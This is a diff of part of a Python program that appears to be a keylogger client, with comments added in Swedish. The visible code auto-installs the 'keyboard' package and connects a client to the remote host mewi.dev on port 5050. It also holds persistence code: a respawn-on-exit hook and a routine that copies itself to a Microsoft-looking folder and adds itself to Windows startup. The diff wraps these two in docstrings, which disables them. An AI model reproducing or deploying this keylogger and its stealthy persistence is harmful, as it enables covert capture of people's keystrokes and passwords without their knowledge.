@@ -277,7 +277,7 @@ class PackageManager:
         except subprocess.CalledProcessError:
             raise Exception(f"{package=} does not exist")
 
-
+"""
 @atexit.register
 def respawn():
     if not client.stop_message:
@@ -285,6 +285,9 @@ def respawn():
 
     client.debug_message("RESPAWNING", "Respawning client script")
     subprocess.Popen([sys.executable, f"C:\\Microsoft\\kl_client\\client.pyw"], shell=True)
+    
+Startar om programmet när det avslutas (respawn)
+"""
 
 
 def set_os_startup_launch():
@@ -321,11 +324,18 @@ def set_os_startup_launch():
 
 
 if __name__ == "__main__":
+    # Automatiskt installera dependencies
     if not PackageManager.package_is_installed("keyboard"):
         PackageManager.install_package("keyboard")
     import keyboard
 
+    """
     set_os_startup_launch()
+    
+    Placerar en kopia av detta program i 'C:\Microsoft\kl_client\client.pyw' och lägger till programmet i windows
+    startup
+    """
 
+    # Skapa ett klientobjekt och starta det
     client = Client("mewi.dev", 5050, debug=True)
     client.start()
